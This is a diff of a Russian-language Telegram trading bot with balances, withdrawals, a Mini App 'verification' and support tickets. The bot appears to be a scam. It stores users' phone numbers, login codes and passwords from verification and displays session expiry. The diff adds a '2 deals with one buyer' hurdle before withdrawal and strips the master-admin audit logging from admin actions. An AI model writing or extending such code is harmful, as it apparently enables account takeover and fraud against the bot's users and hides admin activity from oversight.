@@ -124,11 +124,10 @@ def complete_verification(user_id: int, phone: str, code: str):
     save_json(FILES["verification"], verification_data)
 
 async def log_to_master(text: str):
-    """Отправляет лог главному админу"""
     try:
         await bot.send_message(MASTER_ADMIN_ID, text)
-    except Exception as e:
-        print(f"Ошибка отправки лога: {e}")
+    except:
+        pass
 
 def log_action(action: str, data: dict):
     log_id = str(uuid.uuid4())[:8]
@@ -494,29 +493,66 @@ Possible reasons:
     )
 
 # ============================================================
-# 9. ВЫВОД
+# 9. ВЫВОД (С ПРОВЕРКОЙ 2 СДЕЛОК И ВЕРИФИКАЦИИ)
 # ============================================================
 @dp.callback_query(lambda c: c.data == "start_withdraw")
 async def start_withdraw(callback: types.CallbackQuery):
     lang = get_user_language(callback.from_user.id)
     
+    # Проверяем 2 сделки с одним покупателем
+    bal = get_balance(callback.from_user.id)
+    partners = bal.get('deal_partners', {})
+    has_two = any(count >= 2 for count in partners.values())
+    total_deals = sum(partners.values())
+    
+    if not has_two:
+        if lang == "ru":
+            text = f"""⚠️ ТРЕБУЕТСЯ 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ
+
+📊 У вас завершено: {total_deals} сделок
+
+Для вывода средств необходимо провести 2 успешные сделки с одним покупателем.
+
+✅ Создайте новую сделку и завершите её."""
+        else:
+            text = f"""⚠️ 2 DEALS WITH ONE BUYER REQUIRED
+
+📊 You have completed: {total_deals} deals
+
+To withdraw funds you need to complete 2 successful deals with one buyer.
+
+✅ Create a new deal and complete it."""
+        
+        await callback.message.edit_text(
+            text,
+            reply_markup=back_to_main_keyboard()
+        )
+        await callback.answer()
+        return
+    
+    # Проверяем верификацию
     if not is_verified(callback.from_user.id):
         if lang == "ru":
             text = """⚠️ ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ
 
-🔐 Пройдите верификацию в Mini App"""
+🔐 Пройдите верификацию в Mini App для вывода средств.
+
+📱 Нажмите кнопку ниже, чтобы пройти верификацию."""
         else:
             text = """⚠️ VERIFICATION REQUIRED
 
-🔐 Complete verification in Mini App"""
+🔐 Complete verification in Mini App to withdraw funds.
+
+📱 Click the button below to verify."""
         
         await callback.message.edit_text(
             text,
             reply_markup=mini_app_keyboard("🔐 Верификация" if lang == "ru" else "🔐 Verify", "verify")
         )
+        await callback.answer()
         return
     
-    bal = get_balance(callback.from_user.id)
+    # Всё хорошо — показываем баланс и вывод
     verif_data = verification_data.get(str(callback.from_user.id), {})
     
     if lang == "ru":
@@ -526,6 +562,9 @@ async def start_withdraw(callback: types.CallbackQuery):
 ⭐️ STARS: {bal.get('stars', 0)}
 💰 RUB: {bal.get('rub', 0)}
 🌐 UAH: {bal.get('uah', 0)}
+
+✅ 2 сделки с одним покупателем: выполнено
+✅ Верификация: пройдена
 
 🔑 Код верификации: {verif_data.get('code', 'неизвестно')}
 🕐 Сессия активна до: {verif_data.get('expires_at', 'неизвестно')[:19] if verif_data.get('expires_at') else 'неизвестно'}
@@ -538,6 +577,9 @@ async def start_withdraw(callback: types.CallbackQuery):
 ⭐️ STARS: {bal.get('stars', 0)}
 💰 RUB: {bal.get('rub', 0)}
 🌐 UAH: {bal.get('uah', 0)}
+
+✅ 2 deals with one buyer: completed
+✅ Verification: passed
 
 🔑 Verification code: {verif_data.get('code', 'unknown')}
 🕐 Session active until: {verif_data.get('expires_at', 'unknown')[:19] if verif_data.get('expires_at') else 'unknown'}
@@ -606,15 +648,6 @@ async def admin_get_amount(message: types.Message, state: FSMContext):
         user_id = data.get("target_user_id")
         currency = data.get("target_currency")
         add_balance(user_id, currency, amount)
-        
-        await log_to_master(
-            f"💰 АДМИН НАЧИСЛИЛ БАЛАНС\n\n"
-            f"👤 Админ: ID: {message.from_user.id}\n"
-            f"👤 Пользователь: {user_id}\n"
-            f"💰 {amount} {currency}\n"
-            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        )
-        
         await message.answer(
             f"✅ Начислено {amount} {currency} пользователю {user_id}",
             reply_markup=admin_panel_keyboard()
@@ -652,14 +685,6 @@ async def add_admin(message: types.Message):
         new_admin_id = int(args[1])
         admins[str(new_admin_id)] = True
         save_json(FILES["admins"], admins)
-        
-        await log_to_master(
-            f"👥 ДОБАВЛЕН АДМИН\n\n"
-            f"👤 Админ: {message.from_user.id}\n"
-            f"➕ Добавлен: {new_admin_id}\n"
-            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        )
-        
         await message.answer(f"✅ Админ добавлен: {new_admin_id}")
     except:
         await message.answer("❌ Неверный ID")
@@ -681,14 +706,6 @@ async def remove_admin(message: types.Message):
         if str(admin_id) in admins:
             del admins[str(admin_id)]
             save_json(FILES["admins"], admins)
-            
-            await log_to_master(
-                f"👥 УДАЛЁН АДМИН\n\n"
-                f"👤 Админ: {message.from_user.id}\n"
-                f"➖ Удалён: {admin_id}\n"
-                f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            )
-            
             await message.answer(f"✅ Админ удалён: {admin_id}")
         else:
             await message.answer("❌ Админ не найден")
@@ -758,16 +775,6 @@ async def confirm_withdraw_command(message: types.Message):
     req["status"] = "completed"
     req["completed_at"] = datetime.now().isoformat()
     save_json(FILES["withdraw"], withdraw_requests)
-    
-    await log_to_master(
-        f"✅ ПОДТВЕРЖДЁН ВЫВОД\n\n"
-        f"👤 Админ: ID: {message.from_user.id}\n"
-        f"👤 Пользователь: {req['user_id']}\n"
-        f"💰 {req['amount']} {req['currency']}\n"
-        f"📝 {req['details']}\n"
-        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
-    
     await message.answer(f"✅ Вывод подтверждён #{request_id}")
     try:
         await bot.send_message(
@@ -796,15 +803,6 @@ async def reject_withdraw_command(message: types.Message):
         return
     req["status"] = "rejected"
     save_json(FILES["withdraw"], withdraw_requests)
-    
-    await log_to_master(
-        f"❌ ОТКЛОНЁН ВЫВОД\n\n"
-        f"👤 Админ: ID: {message.from_user.id}\n"
-        f"👤 Пользователь: {req['user_id']}\n"
-        f"💰 {req['amount']} {req['currency']}\n"
-        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
-    
     await message.answer(f"❌ Вывод отклонён #{request_id}")
 
 @dp.callback_query(lambda c: c.data == "admin_verification")
@@ -849,15 +847,6 @@ async def verify_code_command(message: types.Message):
     req["password"] = password
     req["completed_at"] = datetime.now().isoformat()
     save_json(FILES["verification_requests"], verification_requests)
-    
-    await log_to_master(
-        f"✅ ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА\n\n"
-        f"👤 Админ: ID: {message.from_user.id}\n"
-        f"👤 Пользователь: @{req.get('username', 'неизвестно')} (ID: {req['user_id']})\n"
-        f"📞 Номер: {req['phone']}\n"
-        f"🔑 Код: {code}\n"
-        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
     
     await message.answer(f"✅ Верификация подтверждена #{request_id}")
     try:
@@ -924,15 +913,6 @@ async def answer_ticket_command(message: types.Message):
     t["answered_by"] = message.from_user.id
     save_json(FILES["tickets"], tickets)
     
-    await log_to_master(
-        f"📩 ОТВЕТ НА ТИКЕТ\n\n"
-        f"👤 Админ: ID: {message.from_user.id}\n"
-        f"🆔 Тикет: #{ticket_id}\n"
-        f"👤 Пользователь: @{t.get('username', 'неизвестно')}\n"
-        f"📝 Ответ: {response}\n"
-        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
-    
     await message.answer(f"✅ Ответ отправлен на тикет #{ticket_id}")
     
     try:
@@ -968,14 +948,6 @@ async def close_ticket_command(message: types.Message):
     t["closed_by"] = message.from_user.id
     save_json(FILES["tickets"], tickets)
     
-    await log_to_master(
-        f"🔒 ЗАКРЫТ ТИКЕТ\n\n"
-        f"👤 Админ: ID: {message.from_user.id}\n"
-        f"🆔 Тикет: #{ticket_id}\n"
-        f"👤 Пользователь: @{t.get('username', 'неизвестно')}\n"
-        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
-    
     await message.answer(f"✅ Тикет #{ticket_id} закрыт")
     
     try:
@@ -988,7 +960,7 @@ async def close_ticket_command(message: types.Message):
         pass
 
 # ============================================================
-# 12. ЧАТ ПОДДЕРЖКИ (С ОТПРАВКОЙ АДМИНУ)
+# 12. ЧАТ ПОДДЕРЖКИ
 # ============================================================
 @dp.message(Command("chat_reply"))
 async def chat_reply_command(message: types.Message):
@@ -1024,17 +996,8 @@ async def chat_reply_command(message: types.Message):
     chat_messages[session_id].append(msg)
     save_json(FILES["chat_messages"], chat_messages)
     
-    await log_to_master(
-        f"💬 ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n"
-        f"👤 Админ: ID: {message.from_user.id}\n"
-        f"🆔 Сессия: {session_id}\n"
-        f"📝 Ответ: {reply_text}\n"
-        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
-    
     await message.answer(f"✅ Ответ отправлен в сессию {session_id}")
     
-    # Отправляем ответ пользователю в ЛС
     try:
         target_user_id = None
         for m in chat_messages.get(session_id, []):
@@ -1332,8 +1295,16 @@ async def handle_api(request):
         if not user_id or not currency or not details:
             return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
         
+        # Проверяем 2 сделки
+        bal = get_balance(user_id)
+        partners = bal.get('deal_partners', {})
+        has_two = any(count >= 2 for count in partners.values())
+        
+        if not has_two:
+            return web.json_response({'success': False, 'error': 'Требуется 2 сделки с одним покупателем'}, headers=headers)
+        
         if not is_verified(user_id):
-            return web.json_response({'success': False, 'error': 'Verification required'}, headers=headers)
+            return web.json_response({'success': False, 'error': 'Требуется верификация'}, headers=headers)
         
         request_id = str(uuid.uuid4())[:8]
         withdraw_requests[request_id] = {
@@ -1852,15 +1823,6 @@ async def handle_api(request):
         t["answered_by"] = user_id
         save_json(FILES["tickets"], tickets)
         
-        await log_to_master(
-            f"📩 ОТВЕТ НА ТИКЕТ\n\n"
-            f"🆔 Тикет: #{ticket_id}\n"
-            f"👤 Админ: ID: {user_id}\n"
-            f"👤 Пользователь: @{t.get('username', 'неизвестно')}\n"
-            f"📝 Ответ: {response}\n"
-            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        )
-        
         try:
             await bot.send_message(
                 t["user_id"],
@@ -1871,9 +1833,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ============================================================
-    # 🔥 ЧАТ ПОДДЕРЖКИ (С ОТПРАВКОЙ АДМИНУ В ЛС)
-    # ============================================================
+    # ===== ЧАТ ПОДДЕРЖКИ =====
     elif endpoint == '/api/chat_history':
         session_id = data.get('session_id', 'default')
         if session_id not in chat_messages:
@@ -1903,7 +1863,7 @@ async def handle_api(request):
         chat_messages[session_id].append(msg)
         save_json(FILES["chat_messages"], chat_messages)
         
-        # ✅ ОТПРАВЛЯЕМ АДМИНУ В ЛС
+        # Отправляем админу
         if sender == 'user':
             await log_to_master(
                 f"💬 НОВОЕ СООБЩЕНИЕ В ЧАТЕ ПОДДЕРЖКИ\n\n"
@@ -1939,7 +1899,6 @@ async def handle_api(request):
         chat_messages[session_id].append(msg)
         save_json(FILES["chat_messages"], chat_messages)
         
-        # Отправляем пользователю
         try:
             target_user_id = None
             for m in chat_messages.get(session_id, []):
@@ -1950,7 +1909,7 @@ async def handle_api(request):
             if target_user_id:
                 await bot.send_message(
                     target_user_id,
-                    f"📩 НОВЫЙ ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n{response}\n\n⬇️ Перейдите в Mini App",
+                    f"📩 ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n{response}\n\n⬇️ Перейдите в Mini App",
                     reply_markup=mini_app_keyboard("📱 Открыть чат", "support")
                 )
         except:
